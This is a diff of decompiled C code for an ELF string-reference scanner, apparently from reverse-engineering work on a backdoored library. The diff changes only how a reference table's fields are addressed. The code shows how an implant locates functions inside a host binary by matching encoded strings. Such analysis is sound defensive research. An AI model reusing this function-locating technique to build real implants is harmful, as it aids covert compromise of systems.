@@ -37,11 +37,11 @@ BOOL elf_find_string_references(elf_info_t *elf_info,string_references_t *refs)
   dasm_ctx_t scanner_ctx;
   
   string_id_seed = STR_xcalloc_zero_size;
-  entry_cursor = refs->entries;
+  entry_cursor = refs;
   do {
-    ((string_item_t *)&entry_cursor->string_id)->string_id = string_id_seed;
+    (entry_cursor->xcalloc_zero_size).string_id = string_id_seed;
     string_id_seed = string_id_seed + 8;
-    entry_cursor = entry_cursor + 1;
+    entry_cursor = (string_references_t *)&entry_cursor->chdir_home_error;
   } while (string_id_seed != 0xe8);
   scan_ctx = &scanner_ctx;
   for (entry_offset = 0x16; entry_offset != 0; entry_offset = entry_offset + -1) {
@@ -61,18 +61,18 @@ BOOL elf_find_string_references(elf_info_t *elf_info,string_references_t *refs)
       if (string_ptr == (char *)0x0) break;
       entry_offset = 0;
       do {
-        if (((*(long *)((long)&refs->entries[0].xref + entry_offset) == 0) &&
-            (*(EncodedStringId *)((long)&refs->entries[0].string_id + entry_offset) == string_id_cursor)) &&
-           (xref_addr = find_string_reference((u8 *)code_segment_start,(u8 *)code_segment_end,string_ptr),
-           xref_addr != (u8 *)0x0)) {
-          *(u8 **)((long)&refs->entries[0].xref + entry_offset) = xref_addr;
+        if (((*(long *)((long)&(refs->xcalloc_zero_size).xref + entry_offset) == 0) &&
+            (*(EncodedStringId *)((long)&(refs->xcalloc_zero_size).string_id + entry_offset) == string_id_cursor))
+           && (xref_addr = find_string_reference((u8 *)code_segment_start,(u8 *)code_segment_end,string_ptr),
+              xref_addr != (u8 *)0x0)) {
+          *(u8 **)((long)&(refs->xcalloc_zero_size).xref + entry_offset) = xref_addr;
         }
         entry_offset = entry_offset + 0x20;
       } while (entry_offset != 0x360);
       string_ptr = string_ptr + 1;
     }
-    range_cursor = &refs->entries[0].func_start;
-    range_end = &refs[1].entries[0].func_start;
+    range_cursor = &(refs->xcalloc_zero_size).func_start;
+    range_end = &refs[1].xcalloc_zero_size.func_start;
     range_iter = range_cursor;
     do {
       insn_cursor = (dasm_ctx_t *)range_iter[2];
